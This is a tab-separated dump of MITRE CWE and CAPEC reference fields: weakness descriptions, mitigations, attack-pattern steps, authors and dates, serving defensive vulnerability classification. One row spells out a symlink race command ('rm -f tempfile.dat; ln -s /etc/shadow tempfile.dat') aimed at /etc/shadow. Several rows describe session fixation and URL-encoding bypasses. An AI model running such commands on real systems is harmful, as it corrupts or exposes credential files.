16649	56	PeerOf
18066	46	Resources often have explicit instructions on how to be created, used and destroyed. When software does not follow these instructions, it can lead to unexpected behaviors and potentially exploitable states.             Even without explicit instructions, various principles are expected to be adhered to, such as "Do not use an object until after its creation is complete," or "do not use an object after it has been slated for destruction."
11789	28	CWE Content Team
20507	35	MITRE
18413	42	Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.                   If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.
14053	39	2019-01-03
16562	76	2019-04-04
10883	31	1000
25025	45	Base
9516	62	updated Relationships, Taxonomy_Mappings
21072	28	CWE Content Team
13648	31	699
6343	91	Architecture and Design
13548	39	2012-10-30
21978	28	CWE Content Team
13880	88	Intentional Information Exposure
8819	43	Simple
14588	103	Primary
8215	28	CWE Content Team
7375	39	2008-07-01
20222	46	This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.    With variadic arguments, it can be difficult or inefficient for manual analysis to be certain of which function/method is being invoked.
15382	28	CWE Content Team
24223	26	Architecture and Design
14143	56	ChildOf
16602	35	MITRE
10674	35	MITRE
14011	23	An adversary engages in activities to discover any sensitive strings are present within the compiled code of an executable, such as literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis. One specific example of a sensitive string is a hard-coded password. Typical examples of software with hard-coded passwords include server-side executables which may check for a hard-coded password or key during a user's authentication with the server. Hard-coded passwords can also be present in client-side executables which utilize the password or key when connecting to either a remote component, such as a database server, licensing server, or otherwise, or a processes on the same host that expects a key or password. When analyzing an executable the adversary may search for the presence of such strings by analyzing the byte-code of the file itself. Example utilities for revealing strings within a file include 'strings,' 'grep,' or other variants of these programs depending upon the type of operating system used. These programs can be used to dump any ASCII or UNICODE strings contained within a program. Strings can also be searched for using a hex editors by loading the binary or object code file and utilizing native search functions such as regular expressions.
13930	51	2014-06-23
11880	88	Invokable Control Element with Excessive Volume of Commented-out Code
16258	76	2017-08-04
15894	39	2008-07-01
7648	26	Architecture and Design
15966	28	CWE Content Team
19965	28	CWE Content Team
6004	56	ChildOf
6123	43	Simple
24013	42	Identify all possible code paths that might access sensitive resources. If possible, create and use a single interface that performs the access checks, and develop code standards that require use of this interface.
6991	23	The product stores sensitive information in files or directories that are accessible to actors outside of the intended control sphere.
19573	31	1000
9764	81	Integrity
13606	31	1000
9654	50	Design: Enforce principle of least privilege
12660	35	MITRE
5949	39	2010-06-21
24069	63	DoS: Instability
9041	72	An attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands.
17185	104	589
6019	62	updated Other_Notes, Potential_Mitigations, Theoretical_Notes
23258	28	CWE Content Team
19128	35	MITRE
20590	62	updated Relationships, Other_Notes
24332	45	Base
11485	92	Explore
18618	81	Access Control
9818	59	Updated Description Summary, References, Typical_Likelihood_of_Exploit, Typical_Severity
11100	28	Sean Eidemiller
18261	62	updated Relationships
22778	72	Revealed passwords may be reused elsewhere to impersonate the users in question.
23218	35	MITRE
24175	28	CWE Content Team
21524	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.                   The developer might make certain assumptions about the environment in which the software runs - e.g., that the software is running on a single-user system, or the software is only accessible to trusted administrators. When the software is running in a different environment, the permissions become a problem.
18705	31	1000
21957	35	MITRE
15699	61	Draft
18752	103	Primary
11802	56	ChildOf
8103	80	The adversary requires the ability to traverse directory structure.
23767	101	CAPEC Content Team
6704	100	The MITRE Corporation
17895	35	MITRE
22264	35	MITRE
8171	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
11279	56	ChildOf
16232	28	CWE Content Team
15402	50	Changes to registry entries in "HKLM\Software\Microsoft\Windows NT\Winlogon\Notify" that do not correlate with known software, patch cycles, etc are suspicious. New DLLs written to System32 which do not correlate with known good software or patching may be suspicious.
15281	47	Resource Consumption
23945	101	CAPEC Content Team
10688	90	Language-Independent
13273	62	updated Time_of_Introduction
12346	62	updated Observed_Examples
15421	80	Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line.
5784	97	Infected Software
20703	28	CWE Content Team
23398	28	CWE Content Team
9316	88	Doubled Character XSS Manipulations
17202	39	2012-10-30
12625	35	MITRE
8401	23	The software uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism.
10714	62	updated Relationships
11915	39	2019-06-20
6618	26	Operation
11039	35	MITRE
17891	55	CAPEC Content Team
16930	35	MITRE
19071	40	User controllable input that can carry include directives to the web server
10817	28	CWE Content Team
16795	46	For example, an improper dangling cursor could arise from unhandled exceptions. The impact of the issue depends on the cursor's role, but SQL injection attacks are commonly possible.
6087	35	MITRE
25340	35	MITRE
8226	35	MITRE
15355	21	CWE Content Team
9971	28	Eric Dalci
20926	34	When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.
13788	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, glibc in Linux provides protection against free of invalid pointers.
12130	39	2010-12-13
14860	56	ChildOf
14838	44	SOAR Partial
10937	79	Confidentiality
23297	62	updated Weakness_Ordinalities
12978	40	The attacker is able to create Symlink links on the target host.
8992	100	The MITRE Corporation
16754	71	2010
21077	77	Manual Static Analysis
16550	56	ChildOf
5615	31	699
8105	63	Unexpected State
12023	28	CWE Content Team
10095	91	Architecture and Design
24602	105	Mobile
15298	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the pretext that would influence the actions of the specific target.
12073	85	542
8379	48	01
23750	81	Access Control
7464	35	MITRE
12976	28	CWE Content Team
7513	43	Simple
21235	39	2017-11-08
17695	39	2012-05-11
18100	35	MITRE
24214	35	MITRE
11157	35	MITRE
17774	62	updated Relationships
6853	104	562
12558	56	ChildOf
17918	35	MITRE
8338	28	CWE Content Team
20059	92	Exploit
5646	103	Primary
19521	62	updated Taxonomy_Mappings
9781	63	Varies by Context
16946	101	CAPEC Content Team
25023	28	CWE Content Team
20513	28	CWE Content Team
11084	60	01
21593	62	updated Applicable_Platforms
14214	40	An application uses an XML parser to perform transformation on user-controllable data.
6292	81	Integrity
8509	62	updated Other_Notes
9908	28	CWE Content Team
12857	21	CLASP
21311	31	699
21509	39	2010-04-05
10679	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
13952	103	Primary
12725	35	MITRE
20772	31	1003
16871	101	CAPEC Content Team
20840	21	CWE Content Team
12005	26	Operation
16778	48	11
5666	35	MITRE
8997	85	222
13975	62	updated Common_Consequences
6548	35	Cigital
18314	31	699
25052	39	2012-10-30
12488	35	MITRE
8265	56	ChildOf
5918	55	CAPEC Content Team
6425	39	2011-06-01
9780	46	If you do not call super.validate(), the Validation Framework cannot check the contents of the form against a validation form. In other words, the validation framework will be disabled for the given form.
9513	35	MITRE
25276	39	2008-09-08
24256	50	Protect environment variables against unauthorized read and write access.
15179	100	The MITRE Corporation
18246	81	Confidentiality
15695	39	2012-05-11
21153	93	High
20737	59	Updated Related_Attack_Patterns
7017	104	798
22084	104	640
12826	26	Architecture and Design
20086	28	CWE Content Team
9553	91	Implementation
22550	44	SOAR Partial
20768	56	ChildOf
22891	39	2011-03-29
24847	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships
24687	49	2007
10794	31	699
15884	39	2014-07-30
7228	56	ChildOf
15858	62	updated Demonstrative_Examples
17595	95	The target host consumes the data pointed to by the symbolic link file. The target host may either intentionally expect to read a symbolic link or it may be fooled by the replacement of the original resource and read the attackers' symbolic link.
16127	53	The MITRE Corporation
9542	62	updated Potential_Mitigations, Time_of_Introduction
10414	62	updated Relationships
11899	28	CWE Content Team
20407	21	7 Pernicious Kingdoms
9010	35	MITRE
13747	39	2009-07-27
10901	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
21777	35	MITRE
15160	35	MITRE
15531	45	Class
6303	35	MITRE
24745	28	CWE Content Team
13928	35	Cigital
7472	43	Simple
8529	23	The product relies on third-party software components that do      not provide equivalent functionality across all desirable      platforms.
18480	28	CWE Content Team
6703	39	2017-11-08
6184	28	CWE Content Team
12945	97	Pull Data from System Resources
23038	28	CWE Content Team
12482	43	Simple
20202	35	MITRE
12388	35	MITRE
19441	79	Confidentiality
21479	28	CWE Content Team
8496	31	1000
24311	39	2017-01-19
11456	62	updated Likelihood_of_Exploit, References, Relationships
16609	62	updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships
14387	88	Out-of-bounds Write
9262	39	2019-06-20
21363	69	Draft
22940	43	Simple
7978	90	C#
19880	81	Availability
21111	103	Primary
19282	31	1000
7228	31	1000
22936	62	updated Potential_Mitigations
14123	62	updated Common_Consequences
7825	78	Low
11685	47	Gain Privileges
11958	39	2019-01-03
14062	48	05
9613	39	2008-09-08
18972	35	MITRE
25036	42	Refactor the code so that object attributes or fields do not need to be dynamically identified, and only expose getter/setter functionality for the intended attributes.
11638	39	2009-05-27
12813	39	2010-09-27
9512	81	Integrity
22054	73	Create an infinite loop containing commands such as "rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat". Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it, (2) "rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat", and (3) Application opens tempfile.dat for writing, and inadvertently opens /etc/shadow for writing instead.
14427	77	Architecture or Design Review
19583	49	2002
5777	62	updated Related_Attack_Patterns
24588	43	Simple
23040	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19437	31	1000
13728	35	MITRE
7911	76	2018-07-31
19318	91	Implementation
17774	39	2014-07-30
24043	52	This specific weakness is impossible to detect using black box methods. While an analyst could examine memory to see that it has not been scrubbed, an analysis of the executable would not be successful. This is because the compiler has already removed the relevant code. Only the source code shows whether the programmer intended to clear the memory or not, so this weakness is indistinguishable from others.
11996	88	User Interface (UI) Misrepresentation of Critical Information
13629	28	CWE Content Team
17278	66	OWASP , Attack Category : Mobile code: object hijack
20606	39	2008-07-01
22772	45	Variant
21952	42	Enforce usage of strong passwords. A password strength policy should contain the following attributes:                                                                  Minimum and maximum length;                         Require mixed character sets (alpha, numeric, special, mixed case);                         Do not contain user name;                         Expiration;                         No password reuse.
5758	24	MITRE
16714	35	MITRE
13739	28	CWE Content Team
10308	104	237
14093	31	699
7223	104	112
14345	62	updated Relationships
21765	42	Consider adhering to the following rules when allocating and managing an application's memory:                                                                  Double check that your buffer is as large as you specify.                         When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.                         Check buffer boundaries if accessing the buffer in a loop and make sure you are not in danger of writing past the allocated space.                         If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.
19059	39	2014-07-30
15073	62	updated Alternate_Terms, Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings
18310	39	2012-10-30
13099	35	Cigital
11323	28	CWE Content Team
20532	62	updated Common_Consequences
21065	81	Other
6555	39	2010-04-05
18752	56	ChildOf
10085	104	47
9314	35	MITRE
8827	81	Availability
21339	35	MITRE
22101	101	CAPEC Content Team
8646	63	Read Files or Directories
24977	33	OWASP
18098	39	2017-01-19
7820	90	Java
6907	28	CWE Content Team
17055	45	Base
23689	45	Variant
16606	39	2014-06-23
25205	44	High
21395	28	CWE Content Team
16573	26	Architecture and Design
24760	25	Medium
22121	39	2011-06-01
21570	39	2011-06-01
17289	62	updated Relationships
7798	28	CWE Content Team
5881	62	updated Relationships
23569	35	Cigital
24118	62	updated Common_Consequences
23351	23	An adversary exploits a data structure shared between multiple applications or an application pool to affect application behavior. Data may be shared between multiple applications or between multiple threads of a single application. Data sharing is usually accomplished through mutual access to a single memory location. If an adversary can manipulate this shared data (usually by co-opting one of the applications or threads) the other applications or threads using the shared data will often continue to trust the validity of the compromised shared data and use it in their calculations. This can result in invalid trust assumptions, corruption of additional data through the normal operations of the other users of the shared data, or even cause a crash or compromise of the sharing applications.
18630	92	Explore
10484	62	updated Relationships
21821	92	Exploit
19882	89	Standard
15318	76	2019-04-04
23312	39	2012-05-11
15637	42	Data should be private, static, and final whenever possible. This will assure that your code is protected by instantiating early, preventing access, and preventing tampering.
24770	35	MITRE
21351	76	2019-04-04
6503	28	CWE Content Team
20543	76	2018-07-31
24809	95	[Attempt to discover unpublished functions] Using manual or automated means, discover unpublished or undocumented functions exposed by the service.
21422	70	Attacking & Defending Web Services
9098	39	2011-03-29
20050	28	CWE Content Team
16887	103	Primary
13813	45	Variant
22052	62	updated Relationships, Taxonomy_Mappings
21738	39	2012-05-11
14804	80	Customizing attacks to bypass non trivial filters in the application.
22687	28	CWE Content Team
13976	45	Base
16797	23	The program performs CPU computations using          algorithms that are not as efficient as they could be for the          needs of the developer, i.e., the computations can be          optimized further.
13829	31	699
20887	69	Draft
23109	42	Use a CPU and operating system that offers Data Execution Protection (NX) or its equivalent [REF-60] [REF-61].
15562	23	This attack targets the encoding of the URL. An attacker can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL. An URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The attacker could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an attacker may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section).
5747	28	CWE Content Team
15244	35	MITRE
13134	85	312
16789	50	Implementation: Normalize, filter and white list any input that will be used in error messages.
23549	43	Simple
23004	73	Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.
15567	39	2014-07-30
11364	35	MITRE
6949	100	The MITRE Corporation
19352	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20218	44	SOAR Partial
11877	77	Automated Dynamic Analysis
14854	31	699
11795	33	Moritz Lipp
12673	72	The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges.
10198	95	[Abuse the Victim's Session Credentials] The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.
11187	23	In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).
7412	91	Operation
13046	26	Architecture and Design
13619	47	Modify Data
6963	101	CAPEC Content Team
22688	62	updated Time_of_Introduction
17066	39	2009-03-10
23321	62	updated Relationships, Taxonomy_Mappings
17380	35	MITRE
12409	78	Low
12259	89	Detailed
11117	39	2017-11-08
25229	91	Implementation
12477	35	MITRE
15613	42	Use multiple independent authentication schemes, which ensures that -- if one of the methods is compromised -- the system itself is still likely safe from compromise.
16589	85	54
20640	63	Bypass Protection Mechanism
22794	35	MITRE
7410	34	PHP applications are often targeted for having this issue when the PHP interpreter generates the error outside of the application's control. However, other languages/environments exhibit the same issue.
13578	76	2019-09-30
9062	92	Explore
23721	39	2014-07-30
15567	62	updated Relationships, Taxonomy_Mappings
21027	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships, Taxonomy_Mappings
18730	78	High
8100	35	MITRE
24564	62	updated Demonstrative_Examples
14923	63	Gain Privileges or Assume Identity
11347	72	Intended access restrictions can be bypassed, which is often contradictory to what the product's administrator expects.
23032	81	Availability
14696	42	When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
11578	35	MITRE
8250	61	Stable
13323	50	Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.
10520	44	SOAR Partial
11434	62	updated References, Relationships, Taxonomy_Mappings
12028	51	2014-06-23
21175	91	Implementation
8191	28	CWE Content Team
22750	35	MITRE
7003	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
7722	91	Architecture and Design
23951	26	Architecture and Design
6208	31	699
21251	101	CAPEC Content Team
7512	57	Indirect
15753	28	CWE Content Team
7492	39	2019-06-20
6505	21	CWE Content Team
11116	28	CWE Content Team
19818	78	High
15433	62	updated Common_Consequences
7447	28	CWE Content Team
5742	35	MITRE
20301	79	Authorization
18107	39	2008-11-24
18012	47	Other
24289	56	ChildOf
20938	69	Incomplete
12160	40	The target must receive and process XML transactions.
19287	28	CWE Content Team
24654	28	CWE Content Team
18699	56	ChildOf
15816	28	Eric Dalci
5697	35	MITRE
15834	23	The application uses the getlogin() function in a multithreaded context, potentially causing it to return incorrect values.
13242	62	updated Potential_Mitigations
24959	46	For example, in Java, comparing objects using == usually produces deceptive results, since the == operator compares object references rather than values; often, this means that using == for strings is actually comparing the strings' references, not their values.
11217	73	Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.
5701	101	CAPEC Content Team
19772	28	CWE Content Team
6478	66	Ruby On Rails Security Guide
11054	35	MITRE
8007	42	If possible, avoid using METHOD_NEITHER in the IOCTL and select methods that effectively control the buffer size, such as METHOD_BUFFERED, METHOD_IN_DIRECT, or METHOD_OUT_DIRECT.
9392	56	ChildOf
25251	31	699
15293	39	2014-07-30
11563	91	Operation
11593	91	Architecture and Design
6403	62	updated Relationships
17581	28	CWE Content Team
23934	85	578
25426	100	The MITRE Corporation
14239	61	Draft
21857	23	The user interface provides a warning to a user regarding dangerous or sensitive operations, but the warning is not noticeable enough to warrant attention.
22065	90	Language-Independent
10109	31	699
19529	59	Updated Description Summary
8677	35	MITRE
12317	78	High
9701	39	2008-09-08
21957	28	CWE Content Team
13371	39	2017-05-03
11872	31	1000
19808	39	2008-07-01
11421	28	CWE Content Team
13578	100	The MITRE Corporation
22772	43	Simple
17496	35	MITRE
8165	39	2012-05-11
14738	39	2014-07-30
20208	74	3
18344	39	2008-07-01
10948	27	None: No specialized resources are required to execute this type of attack.
21744	25	High
13035	44	High
15224	45	Class
8014	39	2012-05-11
7058	28	Eric Dalci
14229	39	2009-05-27
17912	28	CWE Content Team
7080	33	Robert Seacord
6504	28	Sean Eidemiller
21381	35	MITRE
16199	35	MITRE
19067	90	Language-Independent
10900	35	MITRE
17863	35	MITRE
7920	62	updated Relationships
10336	31	1000
10324	62	updated Relationships
18849	81	Availability
17782	28	CWE Content Team
21211	57	Indirect
8935	35	MITRE
13136	63	Other
19338	28	CWE Content Team
19970	28	CWE Content Team
5888	28	CWE Content Team
25387	50	Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.
18867	35	MITRE
21798	28	CWE Content Team
21049	50	Do not connect untrusted USB devices to systems connected on an organizational network. Additionally, use an isolated testing machine to validate untrusted devices and confirm malware does not exist.
16776	62	updated Applicable_Platforms, Potential_Mitigations, Relationships
5975	81	Other
13524	62	updated Demonstrative_Examples, Other_Notes, References, Relationship_Notes
23880	39	2014-07-30
24473	39	2014-07-30
23459	31	1000
7458	35	MITRE
8467	91	Implementation
24492	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
8544	42	Use system limits, which should help to prevent resource exhaustion. However, the software should still handle low resource conditions since they may still occur.
16823	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18322	28	Eric Dalci
14352	28	CWE Content Team
18793	40	The target application must consult external files or configuration controls to control its execution. All but the very simplest applications meet this requirement.
19212	39	2012-05-11
18313	28	CWE Content Team
10413	35	MITRE
16911	103	Primary
6083	30	J. Viega
8462	103	Primary
14147	35	MITRE
12796	91	Operation
12787	62	updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Other_Notes, Potential_Mitigations, References
13459	62	added/updated demonstrative examples
6422	63	Gain Privileges or Assume Identity
11415	39	2011-03-29
20525	60	07
12530	39	2013-07-17
16592	62	updated Description, Name
5809	62	updated Relationships, Other_Notes, Taxonomy_Mappings
10698	62	updated Common_Consequences
20437	56	PeerOf
23354	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
7544	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
15270	28	CWE Content Team
20783	35	MITRE
20177	78	High
20723	31	1000
21466	91	Architecture and Design
17588	79	Integrity
23953	28	CWE Content Team
18043	56	CanPrecede
21247	35	MITRE
18158	33	Ian Goodfellow
15732	72	At a minimum, attackers can garner information from query strings that can be utilized in escalating their method of attack, such as information about the internal workings of the application or database column names. Successful exploitation of query string parameter vulnerabilities could lead to an attacker impersonating a legitimate user, obtaining proprietary data, or simply executing actions not intended by the application developers.
14012	35	Cigital
24134	28	CWE Content Team
24111	35	MITRE
16180	62	updated Applicable_Platforms
15960	62	updated Relationships
18769	39	2015-12-07
10986	39	2008-07-01
9339	28	CWE Content Team
24916	35	MITRE
24040	35	MITRE
10563	28	CWE Content Team
23183	45	Class
16314	104	289
6487	86	https://www.owasp.org/index.php/HttpOnly
15218	88	Violation of Secure Design Principles
20303	35	MITRE
8597	35	MITRE
7981	35	MITRE
20649	77	Automated Static Analysis
15763	47	Bypass Protection Mechanism
23152	62	updated Demonstrative_Examples, Related_Attack_Patterns
21646	46	If a field is non-final and public, it can be changed once the value is set by any function that has access to the class which contains the field. This could lead to a vulnerability if other parts of the program make assumptions about the contents of that field.
17838	28	CWE Content Team
14781	35	MITRE
18232	31	699
20596	28	CWE Content Team
7371	76	2015-11-09
18302	66	Audio Adversarial Examples: Targeted Attacks on Speech-to-Text
18617	40	The targeted web site must include pages within its published tree that are not connected to its tree of links. The sensitivity of the content of these pages determines the severity of this attack.
24520	103	Primary
8417	39	2008-10-14
23839	81	Confidentiality
6916	40	The targeted service must make assumptions about the behavior of the client application that interacts with it, which can be abused by an adversary.
14257	45	Base
9951	25	Medium
5879	102	ChildOf
24104	28	CWE Content Team
14729	35	MITRE
7269	90	C#
24200	28	CWE Content Team
19429	39	2008-07-01
23617	35	MITRE
21356	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
13175	39	2010-12-13
8871	62	updated Potential_Mitigations
21655	30	Information Technology Laboratory
22145	39	2008-09-08
24829	56	ChildOf
8259	39	2009-05-27
7414	39	2011-06-01
19600	28	CWE Content Team
10399	56	ChildOf
8005	25	High
18593	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
23814	62	updated Relationships
11988	63	DoS: Crash, Exit, or Restart
14086	35	Cigital
16439	74	2
9552	45	Variant
8196	39	2008-11-24
17850	35	MITRE
11432	39	2008-09-08
6467	28	CWE Content Team
19805	35	MITRE
23537	45	Variant
6894	39	2011-06-01
5707	53	The MITRE Corporation
21391	35	MITRE
10752	28	CWE Content Team
10023	95	The adversary decides to leverage the race condition by "running the race", meaning that he would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary can replace the resource and cause an escalation of privilege.
22945	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
14325	57	Indirect
15297	39	2008-11-24
10502	62	updated Description
12379	77	Dynamic Analysis with Automated Results Interpretation
24506	35	MITRE
13546	81	Confidentiality
20018	26	Architecture and Design
20483	28	CWE Content Team
21649	31	1000
20140	39	2012-10-30
10800	80	Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.
22751	46	This issue frequently occurs during authentication, where a difference in failed-login messages could allow an attacker to determine if the username is valid or not. These exposures can be inadvertent (bug) or intentional (design).
7475	61	Draft
22103	54	High
10544	21	CWE Content Team
11759	52	In theory this weakness can be detected through the use of white box testing techniques where specifically crafted test cases are used in conjunction with debuggers to verify the order of statements being executed.
22858	62	updated Relationships
8400	35	MITRE
8250	85	580
20936	62	updated Enabling_Factors_for_Exploitation, Other_Notes
15262	43	Simple
9452	39	2009-03-10
14074	59	Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Payload, Related_Attack_Patterns, Solutions_and_Mitigations
8246	28	CWE Content Team
15297	62	updated Demonstrative_Examples
15858	28	CWE Content Team
21129	69	Draft
19579	72	When the automated recognition is used in a protection mechanism, an attacker may be able to craft inputs that are misinterpreted in a way that grants excess privileges.
6950	90	C++
15278	104	1104
24938	61	Draft
15624	35	MITRE
6011	46	Often, old files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator.
7351	55	CAPEC Content Team
22371	63	Modify Application Data
12348	28	CWE Content Team
18322	35	Cigital
20828	39	2014-06-23
10696	38	None. This attack happens offline.
23664	81	Confidentiality
10847	34	This problem typically occurs when the programmer makes a typo, or copy and paste errors.
20008	62	updated Relationships, Taxonomy_Mappings
16277	28	CWE Content Team
18940	28	CWE Content Team
12317	89	Detailed
23330	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
23943	21	CWE Content Team
22786	88	Missing Lock Check
12509	72	Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
22054	92	Exploit
20945	35	MITRE
10838	62	updated Common_Consequences
24018	39	2011-06-01
15599	101	CAPEC Content Team
15278	45	Base
11895	39	2012-10-30
24720	35	MITRE
8790	57	Indirect
22743	35	MITRE
25098	26	Implementation
20739	88	Incorrect Block Delimitation
23778	50	Design: Include "hosts file"/IP address in the application
15776	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
16868	79	Confidentiality
20125	35	MITRE
21127	72	Use of an index that is outside the bounds of an array can also trigger out-of-bounds read or write operations, or operations on the wrong objects; i.e., "buffer overflows" are not always the result. This may result in the exposure or modification of sensitive data.
13945	35	MITRE
7977	28	CWE Content Team
23061	28	CWE Content Team
11331	96	2018-07-02
14004	56	ChildOf
13336	90	PHP
14206	45	Base
15840	89	Detailed
23481	62	updated Demonstrative_Examples
25438	53	The MITRE Corporation
11998	97	Overread Buffers
18226	74	3
17350	28	CWE Content Team
17989	91	Architecture and Design
15062	100	The MITRE Corporation
8175	31	699
8355	62	updated Relationships, Other_Notes, Taxonomy_Mappings
20710	35	MITRE
9152	28	CWE Content Team
21368	35	MITRE
22902	95	[Optional: Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.
14550	62	updated Potential_Mitigations
9811	39	2012-10-30
18976	61	Draft
12809	28	CWE Content Team
18028	81	Confidentiality
9069	28	CWE Content Team
24430	35	MITRE
5730	80	Advanced knowledge about the inclusion and specific usage of an open source code project within system being targeted for infiltration.
23685	56	ChildOf
9580	63	DoS: Crash, Exit, or Restart
21371	39	2008-09-08
16863	28	CWE Content Team
22808	35	MITRE
18340	95	[Attract a Victim] Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim's browser. This is known as fixating the session. The session identifier can be introduced into the victim's browser by leveraging cross site scripting vulnerability, using META tags or setting HTTP response headers in a variety of ways.
11440	76	2019-04-04
19077	35	MITRE
16963	66	Insecure Library Loading Could Allow Remote Code Execution
19300	39	2011-06-01
13914	28	CWE Content Team
20847	56	ChildOf
7813	56	ChildOf
23940	31	1000
14410	28	CWE Content Team
23938	69	Draft
19006	21	CLASP
11477	102	ChildOf
18124	97	Bypassing Physical Locks
7486	39	2017-11-08
16469	28	CWE Content Team
8972	100	The MITRE Corporation
5610	32	IEEE
10498	35	Cigital
16906	21	CLASP
9739	62	updated Applicable_Platforms, Description, Detection_Factors, Other_Notes
15748	35	MITRE
12033	35	MITRE
8778	28	CWE Content Team
24870	104	697
7844	28	Eric Dalci
20581	39	2011-06-01
22605	28	Eric Dalci
5904	35	Cigital
7942	49	2011
21290	47	Bypass Protection Mechanism
12273	28	CWE Content Team
17517	62	updated Relationships
21668	28	CWE Content Team
15750	50	Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.
18126	92	Exploit
22397	101	CAPEC Content Team
23599	35	Cigital
23623	39	2009-07-27
16821	88	Incorrect Execution-Assigned Permissions
5716	62	updated Maintenance_Notes, Relationships, Taxonomy_Mappings
12935	45	Variant
8877	26	Operation
9185	31	1000
11233	24	MITRE
19158	35	MITRE
17443	35	MITRE
14731	35	MITRE
15016	35	MITRE
23915	85	201
